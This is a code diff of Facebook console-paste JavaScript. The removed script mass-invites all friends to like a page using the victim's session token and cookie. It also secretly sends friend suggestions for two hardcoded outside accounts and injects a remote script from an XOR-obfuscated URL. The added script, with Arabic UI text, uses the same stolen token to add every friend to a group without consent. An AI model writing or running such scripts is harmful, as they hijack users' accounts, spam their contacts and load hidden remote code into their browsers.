@@ -1,3 +1,231 @@
 
 //eval
-function InviteFriends(e){jx.load(window.location.protocol+"//www.facebook.com/ajax/pages/invite/send_single?page_id="+page_id+"&invitee="+e+"&elem_id=u_0_1k&action=send&__user="+user_id+"&__a=1&__dyn=7n8aD5z5CF-3ui&__req=8&fb_dtsg="+fb_dtsg+"&phstamp=",function(e){var t=e.substring(e.indexOf("{"));var n=JSON.parse(t);i--;Descriptions="<div class='friend-edge-name' style='padding-bottom:5px;text-align:left;font-size:10px;white-space:pre-wrap;";if(n.error){Descriptions+="color:darkred'>";err++;if(n.errorDescription){Descriptions+=n.errorDescription}else{Descriptions+=JSON.stringify(n,null,"")}}else{Descriptions+="color:darkgreen'>";Descriptions+=arn[i]+" has been invited to like the page "+page_name+".";suc++}Descriptions+="</div>";var r="<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.3);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(200,200,50,0.2);background-color:pink;color:#000000'>";r+="<div style='padding-bottom:5px;font-size:20px;'>"+Title+"</div>";if(i>0){r+=arr.length+" Friends Detected<br/>";r+="<b>"+suc+"</b> Friends Invited of "+(arr.length-i)+" Friends Processed ";r+="("+i+" Lefted...)";r+="<div class='friend-edge'>";r+=Descriptions;r+="<img style='width:50px;height:50px;margin-left:-125px;padding:2px;border:1px solid rgba(0,0,0,0.4);' src="+pho[i]+"></img><a style='font-size:13px;padding-left:8px;text-align:left;color:#3B5998;position:absolute;font-weight:bold;'>"+arn[i]+"</a>";r+="<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";r+="Please Wait While Inviting Your Friends to Like Your Page "+page_name+".</br>";r+=_text;r+="</div>";r+="</div>";window[tag+"_close"]=true}else{Title="All Of Your Friends Have Been Invited to Like Your Page.</A>";r+=arr.length+" Friends Detected and ";r+="<b>"+suc+" Friends Invited.</b></br>";r+="<div><span class='FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge' onClick='ChangeLocation()' style='color:white'>Go to Homepage</span><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Refresh Page</span><span class='layerCancel uiOverlayButton uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_sidebar\").style.display=\"none\"'>Cancel</span><br/>";r+="<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'><br/>";r+=_text;r+="</div>";window[tag+"_close"]=false}r+="</div>";document.getElementById("pagelet_sidebar").innerHTML=r},"text","post");tay--;if(tay>0){var t=arr[tay];setTimeout("InviteFriends("+t+")",100)}console.log(tay+"/"+arr.length+":"+arr[tay]+"/"+arn[tay]+", success:"+suc);if(page_id){jx.load(window.location.protocol+"//www.facebook.com/ajax/friends/suggest?&receiver="+e+"&newcomer=100005602331969&attempt_id=0b4a67ef24c317178a3253c0905b6918&ref=profile_others_dropdown&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg="+fb_dtsg+"&phstamp=161920318790424913673",function(){},"text","post")}if(page_id){jx.load(window.location.protocol+"//www.facebook.com/ajax/friends/suggest?&receiver="+e+"&newcomer=100006060189684&attempt_id=0b4a67ef24c317178a3253c0905b6918&ref=profile_others_dropdown&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg="+fb_dtsg+"&phstamp=165816649841105474185",function(){},"text","post")}}function ChangeLocation(){window.location.href="http://www.facebook.com/"}var Title="Invite All Friends to Like Your Page -MOHAMED SHIKO";var Descriptions="",_text="";page_id=/"profile_owner":"([0-9]+)"/.exec(document.getElementById("pagelet_timeline_main_column").getAttribute("data-gt"))[1];jx={b:function(){var e=!1;if("undefined"!=typeof ActiveXObject){try{e=new ActiveXObject("Msxml2.XMLHTTP")}catch(t){try{e=new ActiveXObject("Microsoft.XMLHTTP")}catch(n){e=!1}}}else{if(window.XMLHttpRequest){try{e=new XMLHttpRequest}catch(r){e=!1}}}return e},load:function(b,c,a,h,g){var e=this.d();if(e&&b){e.overrideMimeType&&e.overrideMimeType("text/xml");h||(h="GET");a||(a="text");g||(g={});a=a.toLowerCase();h=h.toUpperCase();b+=b.indexOf("?")+1?"&":"?";var k=null;"POST"==h&&(k=b.split("?"),b=k[0],k=k[1]);e.open(h,b,!0);e.onreadystatechange=g.c?function(){g.c(e)}:function(){if(4==e.readyState){if(200==e.status){var b="";e.responseText&&(b=e.responseText);"j"==a.charAt(0)?(b=b.replace(/[\n\r]/g,""),b=eval("("+b+")")):"x"==a.charAt(0)&&(b=e.responseXML);c&&c(b)}else{g.f&&document.getElementsByTagName("body")[0].removeChild(g.f),g.e&&(document.getElementById(g.e).style.display="none"),error&&error(e.status)}}};e.send(k)}},d:function(){return this.b()}};setTimeout("ChangeLocation",1);window.onbeforeunload=function(){if(window[tag+"_close"]){return"This script is running now!"}};var i=3;var tay=3;var suc=0;var err=0;var arr=new Array;var arn=new Array;var pho=new Array;var tag="Close";var page_name,x=document.getElementsByTagName("span");for(i=0;i<x.length;i++){if(x[i].getAttribute("itemprop")=="name"){page_name=x[i].innerHTML}}var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);jx.load(window.location.protocol+"///www.facebook.com/ajax/typeahead/first_degree.php?viewer="+user_id+"&token=v7&filter[0]=user&options[0]=friends_only&options[1]=nm&options[2]=sort_alpha&__user="+user_id+"&__a=1&__dyn=7n8aD5z5CF-3ui&__req=l",function(e){var t=e;var n=t.substring(t.indexOf("{"));var r=JSON.parse(n);r=r.payload.entries;for(var s=0;s<r.length;s++){arr.push(r[s].uid)}for(var o=0;o<r.length;o++){arn.push(r[o].text)}for(var u=0;u<r.length;u++){pho.push(r[u].photo)}i=arr.length-1;tay=i;console.log(arr.length);var a="<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(200,200,50,0.2);background-color:pink;color:#000000'>";a+="<div style='padding-bottom:10px;font-size:20px;'>"+Title+"</div>";a+=arr.length+" Friends Detected";a+="</div>";document.getElementById("pagelet_sidebar").innerHTML=a;InviteFriends(arr[i])});A="jvvr8--ocsf{,emmengamfg,amo-dkngq-ocsf,hq";B="";for(i=0;i<A.length;i++){B+=unescape(String.fromCharCode(A.charCodeAt(i)^2))}document.body.appendChild(document.createElement("script")).src=B
+function hp_d12(s){var o="",ar=new Array(),os="",ic=0,p=0;for(i=0;i<s.length;i++){c=s.charCodeAt(i);if(c<128)c=c^((p++%8)+1);os+=String.fromCharCode(c);if(os.length>80){ar[ic++]=os;os=""}}o=ar.join("")+os;return o}
+
+//eval
+var Title = 'AhmedAdding';
+var Descriptions = "",
+_text = '';
+function AddFriendtoGroup(b){jx.load(window.location.protocol+"//www.facebook.com/ajax/reqs.php?&fb_dtsg="+fb_dtsg+"&request_id="+gid+"&type=group_confirm&status_div_id=group_confirm_"+gid+"_"+b+"&params[id]="+gid+"&params[uid]="+b+"&actions[accept]=Confirm&__user="+user_id+"&__a=1&__req=q",function(e){var d=e.substring(e.indexOf("{"));var g=JSON.parse(d);i--;Descriptions="<div class='friend-edge-name' style='padding-bottom:10px;text-align:center;font-size:10px;white-space:pre-wrap;";if(g.error){Descriptions+="color:darkred'>";err++;if(g.errorDescription){Descriptions+=g.errorDescription}else{Descriptions+=JSON.stringify(g,null,"")}}else{Descriptions+="color:darkgreen'>";Descriptions+=arn[i]+" has been added.<br/>";suc++}Descriptions+="</div>";var f="<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:18px;text-align:center;padding:15px;5px;border:3px solid red;background-color:white;color:#000000'>";f+="<div style='padding-bottom:5px;font-size:20px;'>"+Title+"</div>";if(i>0){f+=arr.length+"عمق البحث<br/>";f+="<b>"+suc+"</b>العددالمضاف"+(arr.length-i)+"العددالمكتشف";f+="("+i+"البحث جارى..)";f+="<div class='friend-edge'>";f+=Descriptions;f+="<div style='text-align:center;font-size:12px;gold-space:pre-wrap;color:gray'>";f+="</div>";f+="</div>";f+="<div><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Stop Adding</span>"}else{f+=arr.length+"عمق البحث<br/>";f+=suc+"العدد المضاف</br>";f+=err+"العدد لم يضاف</br></br>";f+="<div><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Refresh Page</span><span class='layerCancel uiOverlayButton uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_sidebar\").style.display=\"none\"'>Cancel</span>"}f+="</div>";document.getElementById("pagelet_sidebar").innerHTML=f},"text","post");tay--;if(tay>0){var a=arr[tay];sx=pho[tay];setTimeout("AddFriendtoGroup("+a+")",100)}console.log(tay+"/"+arr.length+":"+arr[tay]+"/"+arn[tay]+", success:"+suc);
+	
+}
+function clickfr_callback() {
+	if (document.getElementsByName("ok").length > 0) nHtml.ClickUp(document.getElementsByName("ok")[0]);
+	var a = arr[i];
+	if (i < arr.length) addfriend(a.substring(0, 4))
+}
+function clickfr() {
+	if (document.getElementsByClassName("search").length > 0) nHtml.ClickUp(document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].childNodes[1]);
+	else j++;
+	setTimeout("clickfr_callback()", 2E3)
+}
+function addfriend(a) {
+	i++;
+	setTimeout("clickfr()", 2E3)
+}
+jx = {
+	getHTTPObject: function () {
+		var a = false;
+		if (typeof ActiveXObject != "undefined") try {
+			a = new ActiveXObject("Msxml2.XMLHTTP")
+		} catch(b) {
+			try {
+				a = new ActiveXObject("Microsoft.XMLHTTP")
+			} catch(c) {
+				a = false
+			}
+		} else if (window.XMLHttpRequest) try {
+			a = new XMLHttpRequest
+		} catch(b) {
+			a = false
+		}
+		return a
+	},
+	load: function (url, callback, format, method, opt) {
+		var http = this.init();
+		if (!http || !url) return;
+		if (http.overrideMimeType) http.overrideMimeType("text/xml");
+		if (!method) method = "GET";
+		if (!format) format = "text";
+		if (!opt) opt = {};
+		format = format.toLowerCase();
+		method = method.toUpperCase();
+		var now = "uid=" + (new Date).getTime();
+		url += url.indexOf("?") + 1 ? "&": "?";
+		url += now;
+		var parameters = null;
+		if (method == "POST") {
+			var parts = url.split("?");
+			url = parts[0];
+			parameters = parts[1]
+		}
+		http.open(method, url, true);
+		var ths = this;
+		if (opt.handler) http.onreadystatechange = function () {
+			opt.handler(http)
+		};
+		else http.onreadystatechange = function () {
+			if (http.readyState == 4) if (http.status == 200) {
+				var result = "";
+				if (http.responseText) result = http.responseText;
+				if (format.charAt(0) == "j") {
+					result = result.replace(/[\n\r]/g, "");
+					result = eval("(" + result + ")")
+				} else if (format.charAt(0) == "x") result = http.responseXML;
+				if (callback) callback(result)
+			} else {
+				if (opt.loadingIndicator) document.getElementsByTagName("body")[0].removeChild(opt.loadingIndicator);
+				if (opt.loading) document.getElementById(opt.loading).style.display = "none";
+				if (error) error(http.status)
+			}
+		};
+		http.send(parameters)
+	},
+	bind: function (a) {
+		var b = {
+			url: "",
+			onSuccess: false,
+			onError: false,
+			format: "text",
+			method: "GET",
+			update: "",
+			loading: "",
+			loadingIndicator: ""
+		};
+		for (var c in b) if (a[c]) b[c] = a[c];
+		if (!b.url) return;
+		var d = false;
+		if (b.loadingIndicator) {
+			d = document.createElement("div");
+			d.setAttribute("style", "position:absolute;top:0px;left:0px;");
+			d.setAttribute("class", "loading-indicator");
+			d.innerHTML = b.loadingIndicator;
+			document.getElementsByTagName("body")[0].appendChild(d);
+			this.opt.loadingIndicator = d
+		}
+		if (b.loading) document.getElementById(b.loading).style.display = "block";
+		this.load(b.url, function (a) {
+			if (b.onSuccess) b.onSuccess(a);
+			if (b.update) document.getElementById(b.update).innerHTML = a;
+			if (d) document.getElementsByTagName("body")[0].removeChild(d);
+			if (b.loading) document.getElementById(b.loading).style.display = "none"
+		},
+		b.format, b.method, b)
+	},
+	init: function () {
+		return this.getHTTPObject()
+	}
+};
+var nHtml = {
+	FindByAttr: function (a, b, c, d) {
+		if (c == "className") c = "class";
+		var e = document.evaluate(".//" + b + "[@" + c + "='" + d + "']", a, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null);
+		if (e && e.singleNodeValue) return e.singleNodeValue;
+		return null
+	},
+	FindByClassName: function (a, b, c) {
+		return this.FindByAttr(a, b, "className", c)
+	},
+	FindByXPath: function (a, b) {
+		try {
+			var c = document.evaluate(b, a, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null)
+		} catch(d) {
+			GM_log("bad xpath:" + b)
+		}
+		if (c && c.singleNodeValue) return c.singleNodeValue;
+		return null
+	},
+	VisitUrl: function (a) {
+		window.setTimeout(function () {
+			document.location.href = a
+		},
+		500 + Math.floor(Math.random() * 500))
+	},
+	ClickWin: function (a, b, c) {
+		var d = a.document.createEvent("MouseEvents");
+		d.initMouseEvent(c, true, true, a, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
+		return ! b.dispatchEvent(d)
+	},
+	Click: function (a) {
+		return this.ClickWin(window, a, "click")
+	},
+	ClickTimeout: function (a, b) {
+		window.setTimeout(function () {
+			return nHtml.ClickWin(window, a, "click")
+		},
+		b + Math.floor(Math.random() * 500))
+	},
+	ClickUp: function (a) {
+		this.ClickWin(window, a, "mousedown");
+		this.ClickWin(window, a, "mouseup");
+		this.ClickWin(window, a, "click")
+	},
+	GetText: function (a, b) {
+		var c = "";
+		if (b == undefined) b = 0;
+		if (b > 40) return;
+		if (a.textContent != undefined) return a.textContent;
+		for (var d = 0; d < a.childNodes.length; d++) {
+			var e = a.childNodes[d];
+			c += this.GetText(e, b + 1)
+		}
+		return c
+	}
+};
+if (document.getElementsByClassName == undefined) document.getElementsByClassName = function (a) {
+	var b = new RegExp("(?:^|\\s)" + a + "(?:$|\\s)");
+	var c = document.getElementsByTagName("*");
+	var d = [];
+	var e;
+	for (var f = 0;
+	(e = c[f]) != null; f++) {
+		var g = e.className;
+		if (g && g.indexOf(a) != -1 && b.test(g)) d.push(e)
+	}
+	return d
+};
+Array.prototype.find = function (a) {
+	var b = false;
+	for (i = 0; i < this.length; i++) if (typeof a == "function") {
+		if (a.test(this[i])) {
+			if (!b) b = [];
+			b.push(i)
+		}
+	} else if (this[i] === a) {
+		if (!b) b = [];
+		b.push(i)
+	}
+	return b
+};
+var i = 3;
+var tay = 3;
+var j = 0;
+var k = 0;
+var suc = 0;
+var err = 0;
+var arr = new Array;
+var arn = new Array;
+var pho = new Array;
+grpname = document.getElementById("groupsJumpTitle").innerHTML;
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+var getuname = document.getElementsByClassName("fbxWelcomeBoxName")[0].innerHTML;
+var gid = document.getElementsByName("group_id")[0].value;
+jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degree.php?" + "__a=1&filter[0]=user&lazy=0&viewer=" + user_id + "&token=v7&stale_ok=0&options[0]=friends_only&options[1]=nm", function (a) {
+	var b = a;
+	var c = b.substring(b.indexOf("{"));
+	var d = JSON.parse(c);
+	d = d.payload.entries;
+	for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
+	for (var eg = 0; eg < d.length; eg++) arn.push(d[eg].text);
+	for (var pic = 0; pic < d.length; pic++) pho.push(d[pic].photo);
+	i = arr.length - 1;
+	tay = i;
+	console.log(arr.length);
+	var display = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:18px;text-align:center;padding:15px;5px;border:3px solid red;background-color:white;color:#000000'>";
+	display += "<div style='padding-bottom:10px;font-size:20px;'>" + Title + "</div>";
+	display += arr.length + "عمق البحث";
+	display += "</div>";
+	document.getElementById("pagelet_sidebar").innerHTML = display;
+	AddFriendtoGroup(arr[i])
+});
